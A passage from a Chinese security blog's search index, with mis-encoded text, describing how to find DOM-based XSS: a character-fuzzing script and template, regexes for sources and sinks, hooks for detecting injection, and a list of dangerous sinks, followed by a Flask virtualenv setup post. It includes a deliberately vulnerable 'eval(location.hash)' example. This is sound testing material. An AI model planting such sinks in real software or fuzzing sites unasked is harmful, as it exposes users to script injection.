#éå†è¿™äº›å­—ç¬¦ é€ä¸€ç”Ÿæˆfuzzingå†…å®¹ fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c) fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c))) fuzz_area_result+=fuzz_area_r+&apos;\\n&apos; print fuzz_area_r result=template.replace(fuzz_area,fuzz_area_result) set_result(result_file,result)if __name__==&apos;__main__&apos;: fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;) ä¸‹é¢ä¸ºfuzz_xss_0.htmlçš„å†…å®¹12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Fuzz xss 0&lt;/title&gt; &lt;script&gt; function $(x)&#123;return document.getElementById(x);&#125; function f(id)&#123; $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;&lt;code&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;/code&gt;&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;br/&gt;&lt;h3&gt;Fuzzing...&lt;/h3&gt;&lt;fuzz&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;&lt;/fuzz&gt;&lt;/body&gt;&lt;/html&gt; é€šè¿‡ä¸Šé¢çš„fuzzingæŠ€å·§ï¼Œå¯ä»¥è‡ªè¡Œæ‰©å±• DOM XSS æŒ–æ˜ é™æ€æ–¹æ³• é™æ€æ–¹æ³•æŸ¥æ‰¾å±é™©å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…ã€‚123456789101112131415Finding SourcesThe following regular expression attempts to match most common DOMXSS sources (BETA):/(location\\s*[\\[.])|([.\\[]\\s*[&quot;&apos;]?\\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\\W)|(localStorage|sessionStorage|Database)/Finding SinksThe following regular expression attempts to match most common DOMXSS sinks (BETA):/((src|href|data|location|code|value|action)\\s*[&quot;&apos;\\]]*\\s*\\+?\\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\\s*[&quot;&apos;\\]]*\\s*\\()/This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:/after\\(|\\.append\\(|\\.before\\(|\\.html\\(|\\.prepend\\(|\\.replaceWith\\(|\\.wrap\\(|\\.wrapAll\\(|\\$\\(|\\.globalEval\\(|\\.add\\(|jQUery\\(|\\$\\(|\\.parseHTML\\(/ è¯¦æƒ…å¯ä»¥çœ‹https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wikiä¸€æ—¦å‘ç°é¡µé¢å­˜åœ¨å¯ç–‘ç‰¹å¾ï¼Œå°±è¿›è¡Œäººå·¥åˆ†æï¼Œè¿™æ˜¯é™æ€æ–¹æ³•çš„ä»£ä»·ï¼Œå¯¹äººå·¥å‚ä¸è¦æ±‚å¾ˆé«˜ åŠ¨æ€æ–¹æ³• åŠ¨æ€æ–¹æ³•ç›¸å½“äºä¸€æ¬¡Javascriptæºç åŠ¨æ€å®¡è®¡çš„è¿‡ç¨‹ã€‚ä¹¦ä¸­æåˆ°äº†ä¸¤ç§æ€è·¯123&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt; å°±æ‹¿ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œå¦‚ä½•æ£€æµ‹ä¸Šé¢çš„DOM XSS æ€è·¯ä¸€ å€Ÿç”¨æµè§ˆå™¨è‡ªèº«çš„åŠ¨æ€æ€§ï¼Œå¯ä»¥å†™Firefoxæ’ä»¶ï¼Œæ‰¹é‡å¯¹ç›®æ ‡åœ°å€å‘èµ·è¯·æ±‚ï¼ˆä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼‰ï¼Œè¯·æ±‚çš„å½¢å¼ä¸ºï¼šåœ¨ç›®æ ‡åœ°å€ååŠ ä¸Š#fuzzingå†…å®¹ï¼Œå°±å½“å‰è¿™ä¸ªä¾‹å­æ¥è¯´ã€‚æ¯”å¦‚å½“å‰fuzzingå†…å®¹ä¸ºï¼švar x=&#39;d0mx55&#39; å¹¶ä¸”å¯¹å¸¸è§çš„è¾“å‡ºç‚¹å‡½æ•°è¿›è¡ŒåŠ«æŒï¼Œå¦‚123456var _eval=eval;eval=function(x)&#123; if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125; if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;); _eval(x);&#125;; åœ¨javascriptå±‚é¢åŠ«æŒinnerHTMLè¿™æ ·çš„å±æ€§å·²ç»æ²¡é‚£ä¹ˆå®¹æ˜“äº†ï¼Œå¸¸ç”¨çš„å±æ€§åŠ«æŒå¯ä»¥é’ˆå¯¹å…·ä½“çš„å¯¹è±¡è®¾ç½®__defineSetter__ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç 12window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);window.x=&apos;xxxxxYYYYYYYY&apos;; å½“xèµ‹å€¼çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘äº‹å…ˆå®šä¹‰å¥½çš„Setteræ–¹æ³•ã€‚innerHTMLå±æ€§å±äºé‚£äº›èŠ‚ç‚¹å¯¹è±¡ï¼Œæƒ³åŠ«æŒå…·ä½“èŠ‚ç‚¹å¯¹è±¡çš„innerHTMLï¼Œéœ€è¦äº‹å…ˆçŸ¥é“è¿™ä¸ªå…·ä½“èŠ‚ç‚¹çš„å¯¹è±¡ï¼Œç„¶åè®¾ç½®__defineSetter__,è¿™æ ·å¦‚æœè¦æ£€æµ‹DOM XSSï¼Œå°±è¦åŠ«æŒæ‰€æœ‰çš„è¾“å‡ºç‚¹ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæ€è·¯äºŒå¯èƒ½ä¼šæ¯”è¾ƒç®€å•ä¸€ç‚¹ æ€è·¯äºŒ ä»ç„¶å€Ÿç”¨æµè§ˆå™¨åŠ¨æ€æ‰§è¡Œçš„ä¼˜åŠ¿ï¼Œå†™ä¸€ä¸ªFirefoxæ’ä»¶ï¼Œæˆ‘ä»¬å®Œå…¨ä»¥é»‘ç›’çš„æ–¹å¼è¿›è¡Œæ¨¡ç³Šæµ‹è¯•è¾“å…¥ç‚¹ï¼Œç„¶ååˆ¤æ–­æ¸²æŸ“åçš„DOMæ ‘ä¸­æ˜¯å¦æœ‰æˆ‘ä»¬æœŸå¾…çš„å€¼ï¼Œæ¯”å¦‚ï¼Œæ¨¡ç³Šæµ‹è¯•çš„å†…å®¹éƒ½æœ‰å¦‚ä¸‹ä¸€æ®µä»£ç document.write(&#39;d0m&#39;+&#39;x55&#39;)å¦‚æœè¿™æ®µä»£ç é¡ºåˆ©æ‰§è¡Œäº†å°±ä¼šå­˜åœ¨d0mx55æ–‡æœ¬èŠ‚ç‚¹ï¼Œåç»­çš„æ£€æµ‹å·¥ä½œåªè¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡æœ¬èŠ‚ç‚¹å°±å¯ä»¥äº†123if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123; alert(&apos;found dom xss&apos;);&#125; è¿™ä¸ªæ€è·¯ä»¥DOMæ ‘çš„æ”¹å˜ä¸ºåˆ¤æ–­ä¾æ®ï¼Œç®€å•å‡†ç¡®ï¼Œä½†æ˜¯åŒæ ·æ— æ³•é¿å…é‚£äº›é€»è¾‘åˆ¤æ–­ä¸Šå¯¼è‡´çš„æ¼æŠ¥ã€‚ é™„å½• è¾“å‡ºç‚¹ javascript code ç›´æ¥è¾“å‡ºHTMLå†…å®¹ document.write(â€¦)document.writeln(â€¦) document.body.innerHtml=â€¦ ç›´æ¥ä¿®æ”¹DOMæ ‘ï¼ˆåŒ…æ‹¬DHTMLäº‹ä»¶ï¼‰ document.forms[0].action=â€¦document.attachEvent(â€¦)document.createâ€¦(â€¦)document.execCommand(â€¦)document.body. â€¦widow.attachEvent(â€¦) æ›¿æ¢document url document.location=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§)document.location.hostname=â€¦document.location.replace(â€¦)document.location.assign(â€¦)documnent.URL=â€¦window.navigate(â€¦) æ‰“å¼€æˆ–ä¿®æ”¹æ–°çª—å£ document.open(â€¦)window.open(â€¦)window.location.href=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§) ç›´æ¥æ‰§è¡Œè„šæœ¬ eval(â€¦)window.execScript(â€¦)window.setInterval(â€¦)window.setTimeout(â€¦)"},{"title":"flask virtualenvç¯å¢ƒæ­å»º","permalink":"http://blog.0kami.cn/2016/03/16/old-old-flask-virtualenv/","text":"å¼•è¨€python virtualenvä¸ºflaskç­‰webæ¡†æ¶æä¾›è™šæ‹Ÿpythonç¯å¢ƒï¼ˆå…¶ä»–åº”ç”¨ä¹Ÿå¯ä»¥ï¼‰ï¼Œè¿™æ ·å¯ä»¥é˜²æ­¢å¼€å‘è¿‡ç¨‹ä¸­å®‰è£…çš„ä¾èµ–å½±å“åŸä¸»æœºä¸Šçš„pythonç¯å¢ƒï¼Œè€Œä¸”åœ¨è¿ç§»åˆ°ä¸Šçº¿ç¯å¢ƒä¸­æ—¶ï¼Œçœå»äº†é…ç½®ä¸Šçº¿ç¯å¢ƒä¸­çš„pythonè¿è¡Œç¯å¢ƒã€‚ å®‰è£…virtualenv è¿™é‡Œæˆ‘æ¨èä½¿ç”¨pipæˆ–è€…easy_installå®‰è£…ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥é€šè¿‡ä¸‹è½½virtualenv.pyæ¥æ„å»ºè™šæ‹Ÿç¯å¢ƒã€‚ ä½¿ç”¨pipå‘½ä»¤ pip install virtualenv å»ºç«‹ç¯å¢ƒ é¦–å…ˆè¿›å…¥ç½‘ç«™çš„æ ¹ç›®å½•ï¼ˆæˆ–è€…æ˜¯ä»»ä½•éœ€è¦å»ºç«‹è™šæ‹Ÿç¯å¢ƒçš„æ–‡ä»¶å¤¹ä¸‹ï¼‰ ä½¿ç”¨doså‘½ä»¤ virtualenv venv å…¶ä¸­venvä¸ºpythonçš„è™šæ‹Ÿç¯å¢ƒï¼Œå…¶ä¸­åŒ…æ‹¬äº†python.exeã€pipã€easy_installç­‰pythonç¯å¢ƒã€‚ æ¿€æ´»ç¯å¢ƒ å®Œæˆä¸Šä¸€æ­¥åï¼Œæ¥ä¸‹æ¥éœ€è¦åœ¨dosç•Œé¢æ¿€æ´»è™šæ‹Ÿç¯å¢ƒï¼Œè¿™æ ·å¯ä»¥ä½¿å¾—æ¥ä¸‹æ¥ä¸‹è½½çš„pythonæ¨¡å—éƒ½ä½äºvenvä¸‹çš„pipç¯å¢ƒä¸­Scripts\\activate æ¿€æ´»è™šæ‹Ÿç¯å¢ƒdeactivate é€€å‡ºè™šæ‹Ÿç¯å¢ƒ æ¿€æ´»åå‘½ä»¤è¡Œå¼€å¤´å¤šäº†ï¼ˆvenvï¼‰ï¼Œå¦‚ä¸‹12E:\\code\\python-workplace\\flasker\\venv&gt;Scripts\\activate(venv) E:\\code\\python-workplace\\flasker\\venv&gt; å®‰è£…æ¨¡å— åœ¨ä¸Šé¢çš„åŸºç¡€ä¸‹ï¼Œé€šè¿‡pip install xxxxå®‰è£…çš„æ¨¡å—éƒ½æ˜¯å®‰è£…åœ¨venvç¯å¢ƒä¸‹çš„ï¼Œå¯¹ä¸»æœºä¸Šçš„ç¯å¢ƒæ²¡æœ‰å½±å“ã€‚ å¼•å…¥è·¯å¾„ åœ¨å…·ä½“ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéœ€è¦æŠŠvenvçš„è·¯å¾„å¯¼å…¥sys.pathï¼Œè¿™æ ·æ‰å¯ä»¥ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒä¸­çš„pythonæ¨¡å—ã€‚12importos,syssys.path.append(os.getcwd()+'\\\\venv\\\\Lib\\\\site-packages') åˆ°è¿™é‡Œå°±å®Œæˆäº†pythonè™šæ‹Ÿç¯å¢ƒçš„æ­å»ºï¼Œæ€»ä½“å¯¹ç»å¸¸å˜åŠ¨ç¼–ç¨‹ç¯å¢ƒçš„åŸæ—­çŒ¿æ¥è¯´è¿™æ˜¯ä¸ªéå¸¸æœ‰ç”¨åŠŸèƒ½ã€‚ ==The End=="}]}